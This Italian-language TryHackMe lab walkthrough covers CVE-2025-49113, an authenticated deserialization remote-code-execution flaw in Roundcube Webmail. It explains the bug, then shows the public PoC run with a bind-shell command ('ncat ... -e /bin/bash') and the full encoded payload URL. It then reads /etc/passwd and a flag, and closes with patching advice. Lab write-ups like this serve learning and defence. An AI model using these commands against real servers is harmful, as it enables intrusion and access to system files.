
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/roundcubecve202549113

### Introduzione

[Roundcube](https://roundcube.net/) è un progetto di webmail gratuito e open source. È ricco di funzionalità e disponibile in oltre ottanta lingue. Sebbene le sue funzionalità integrate siano numerose, possono essere ulteriormente ampliate grazie al supporto di plug-in di terze parti.

Richiede principalmente un server web con supporto PHP e un server SQL per funzionare. Apache , Nginx e Lighttpd, tra gli altri, possono facilmente soddisfare i requisiti del server web; MySQL, MariaDB, PostgreSQL, SQLite e molti altri possono soddisfare i requisiti del database. Questa versatilità rende Roundcube una scelta molto popolare per la webmail, soprattutto tra i provider di hosting.

Di recente è stata scoperta una vulnerabilità in Roundcube Webmail; interessa tutte le versioni 1.5.x e 1.6.x **prima** delle 1.5.10 e 1.6.11. Questa vulnerabilità consente l'esecuzione di codice remoto ( RCE ) da parte di utenti autenticati; in altre parole, credenziali valide per la webmail sono sufficienti all'attaccante per eseguire comandi sul sistema host. Questa vulnerabilità ha un punteggio di gravità CVSS 3.x di 9,9, ovvero critico. Roundcube ha già rilasciato le versioni 1.5.10 e 1.6.11 e ne [consiglia vivamente l'aggiornamento](https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10) .

In questa sala verrà spiegato cosa rende possibile questa vulnerabilità e verrà illustrato come sfruttarla in un ambiente di laboratorio.

### Contesto tecnico

**La serializzazione** è il processo di conversione di un oggetto, ovvero un'istanza di una classe in PHP , Java o Python, in un formato memorizzabile o trasmissibile. Questo processo è comunemente utilizzato per memorizzare oggetti in file o database e per inviarli in rete, ad esempio tramite API o cookie.

Una **vulnerabilità di deserializzazione** è una falla di sicurezza che si verifica quando un'applicazione deserializza dati non attendibili o manomessi. **La deserializzazione** è il processo di conversione dei dati da un formato serializzato, come un flusso di byte o una stringa, in un oggetto programma. Se questo processo viene eseguito in modo non sicuro, un aggressore può manipolare i dati serializzati per eseguire codice arbitrario o persino aumentare i privilegi, tra le altre azioni dannose.

[Kirill Firsov](https://x.com/k_firsov) ha scoperto una vulnerabilità di deserializzazione in Roundcube Webmail. Hanno condiviso sul loro sito web la linea di pensiero e [la ricerca che ha portato alla scoperta](https://fearsoff.org/research/roundcube) ; è una lettura interessante. La vulnerabilità è causata dal fatto `_from`che la proprietà `upload.php`non viene verificata accuratamente per valori sicuri prima della deserializzazione.

Questa vulnerabilità può essere dedotta dai [commit per la versione 1.5.10](https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695#diff-e941e729aef9ce9f97dde65bc93b160e6f972cd8731e0dc2002cb34f95e5675bR35) e [per la versione 1.6.11](https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d) . Anche se non hai familiarità con PHP , controllando le righe di commit e i commenti potrai farti un'idea di come questa vulnerabilità è stata risolta. Nello screenshot qui sotto, puoi facilmente dedurre che le righe aggiuntive ora controllano se il parametro URL `_from`contiene caratteri non sicuri.

Questa vulnerabilità consente l'esecuzione di codice remoto tramite la sua deserializzazione non sicura. L'aggressore deve comunque creare un payload affinché la deserializzazione produca il risultato desiderato.

### Exploitation
  
Avviate la macchina virtuale e AttackBox per poter seguire la procedura. (oppure Kali)

La macchina virtuale ha installata la versione 1.6.10 di Roundcube Webmail. Se non hai familiarità con Roundcube Webmail, puoi avviare Firefox su AttackBox ed esplorarne l'interfaccia. Puoi utilizzare le credenziali di Ellie per accedere alla webmail all'indirizzo `http://MACHINE_IP/roundcube`.

- Nome utente:`ellieptic`
- Password:`ChangeMe123`

#### Codice exploit

FearsOff ha pubblicato un codice exploit proof of concept ( PoC ) sul suo [repository GitHub](https://github.com/fearsoff-org/CVE-2025-49113) . Il modo più semplice per seguirlo è scaricare il codice exploit tramite [nome del file] `git clone https://github.com/fearsoff-org/CVE-2025-49113`. Questo è mostrato nel terminale qui sotto.

Terminale Kali

```shell-session
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Downloads/Laboratori]
└─$ git clone https://github.com/fearsoff-org/CVE-2025-49113
Cloning into 'CVE-2025-49113'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 8 (delta 1), reused 8 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (8/8), 7.33 KiB | 2.44 MiB/s, done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Downloads/Laboratori]
└─$ cd CVE-2025-49113/
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Downloads/Laboratori/CVE-2025-49113]
└─$ ls
CVE-2025-49113.php  rc_install.sh  README.md
                                                          
```



**Nota** : questo `CVE-2025-49113.php`è l'exploit PoC. Se sei un utente free, AttackBox non ha accesso a Internet e devi usare un altro metodo per inserire il file sopra indicato in AttackBox. Un modo semplice sarebbe copiare il file dalla [sua pagina GitHub](https://github.com/fearsoff-org/CVE-2025-49113/blob/main/CVE-2025-49113.php) , creare un nuovo file su AttackBox usando il tuo editor di testo preferito e salvarlo con estensione `.php`.

Esegue `CVE-2025-49113.php`i passaggi necessari per eseguire il payload desiderato sul server di destinazione. Dopo aver recuperato un token CSRF e un cookie di sessione, questo script PHP PoC effettua l'accesso utilizzando il nome utente e la password forniti. I passaggi principali di questo script sono i seguenti:

- Crea un oggetto PHP serializzato dannoso
- Incorpora l'oggetto creato nel `_from`parametro
- Invia una richiesta POST all'endpoint utilizzando il parametro `upload.php`dannoso`_from`

Il parametro dannoso ricevuto verrà deserializzato ed eseguito sul lato server.

#### Esecuzione dell'Exploit

Per eseguire il codice PoC , è necessario utilizzare i seguenti argomenti: `php CVE-2025-49113.php target_url username password command`.

- Il **target_url** dovrebbe essere sostituito dall'URL di Roundcube Webmail, ovvero  http://10.10.177.179/roundcube
- Il **nome utente** e **la password** sono le credenziali valide per accedere alla webmail
- Il **comando** è il “payload” che si desidera venga eseguito sul server di destinazione

Usiamolo `ncat -lvnp 4444 -e /bin/bash`per impostare una shell di binding; questo renderà più facile dimostrare l'exploit e verificare se è stato eseguito correttamente. Un esempio è mostrato nel terminale qui sotto.

Terminale Kali

```shell-session
php CVE-2025-49113.php http://10.10.177.179/roundcube ellieptic ChangeMe123 "ncat -lvnp 4444 -e /bin/bash"
```
```
┌──(kali㉿kali)-[~/Downloads/Laboratori/CVE-2025-49113]
└─$ php CVE-2025-49113.php http://10.10.177.179/roundcube ellieptic ChangeMe123 "ncat -lvnp 4444 -e /bin/bash"
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: ellieptic

### Authentication successful

### Command to be executed: 
ncat -lvnp 4444 -e /bin/bash

### Injecting payload...

### End payload: http://10.10.177.179/roundcube/?_from=edit-%21%C5%22%C5%3B%C5i%C5%3A%C50%C5%3B%C5O%C5%3A%C51%C56%C5%3A%C5%22%C5C%C5r%C5y%C5p%C5t%C5_%C5G%C5P%C5G%C5_%C5E%C5n%C5g%C5i%C5n%C5e%C5%22%C5%3A%C51%C5%3A%C5%7B%C5S%C5%3A%C52%C56%C5%3A%C5%22%C5%5C%C50%C50%C5C%C5r%C5y%C5p%C5t%C5_%C5G%C5P%C5G%C5_%C5E%C5n%C5g%C5i%C5n%C5e%C5%5C%C50%C50%C5_%C5g%C5p%C5g%C5c%C5o%C5n%C5f%C5%22%C5%3B%C5S%C5%3A%C53%C50%C5%3A%C5%22%C5n%C5c%C5a%C5t%C5+%C5-%C5l%C5v%C5n%C5p%C5+%C54%C54%C54%C54%C5+%C5-%C5e%C5+%C5%2F%C5b%C5i%C5n%C5%2F%C5b%C5a%C5s%C5h%C5%3B%C5%23%C5%22%C5%3B%C5%7D%C5i%C5%3A%C50%C5%3B%C5b%C5%3A%C50%C5%3B%C5%7D%C5%22%C5%3B%C5%7D%C5%7D%C5&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...

```

Vale la pena sottolineare che l'exploit potrebbe richiedere uno o due minuti per rispondere e a volte lo script restituisce un messaggio di errore nonostante il payload venga eseguito correttamente sul target. In un tentativo, abbiamo ricevuto il seguente messaggio di errore; tuttavia, la shell di binding è stata configurata correttamente e siamo riusciti a connetterci ad essa dall'AttackBox.

Terminale Kali

```shell-session
PHP Warning:  file_get_contents(http://10.10.177.179/roundcube/): Failed to open stream: HTTP request failed! in /home/kali/Downloads/Laboratori/CVE-2025-49113/CVE-2025-49113.php on line 237
### Error: CSRF token not found in response body
```

Sull'AttackBox, è necessario connettersi alla shell bind in ascolto sulla porta `4444`.

Terminale Kali

```shell-session
nc 10.10.177.179 4444
pwd
/var/www/html/roundcube
whoami
www-data
```

Rispondi alle domande seguenti

Uno degli utenti ha il nome Maggie; qual è il suo cognome?

```
cat /etc/passwd
```
```
cat /etc/passwd|grep "maggie"
maggiebyte:x:1002:1002:Maggie Byte,,,:/home/maggiebyte:/bin/bash
```

```
byte
```

Qual è il valore del flag salvato in `/etc`?
```
ls /etc
```

```
cat /etc/flag.txt
```

```
cat /etc/flag.txt


THM{XXXXXXXXXXXXXXXX}

"After three rounds of coffee, I deserialised the object."

```

```
THM{XXXXXXXXXXXXXXXXX}
```

#### Conclusione e mitigazione

Questa vulnerabilità richiede solo credenziali webmail valide e funziona con le installazioni predefinite. L'exploit può essere difficile da rilevare, considerando che può facilmente essere scambiato per traffico normale. Considerata la gravità dell'exploit, si consiglia agli utenti che utilizzano le versioni 1.5.x e 1.6.x di aggiornare rispettivamente alle versioni 1.5.10 e 1.6.11. Se per qualche motivo l'aggiornamento non fosse fattibile, una possibile mitigazione potrebbe essere il [blocco di`upload.php`](https://www.vicarius.io/vsociety/posts/cve-2025-49113-roundcube-mitigation-script) .

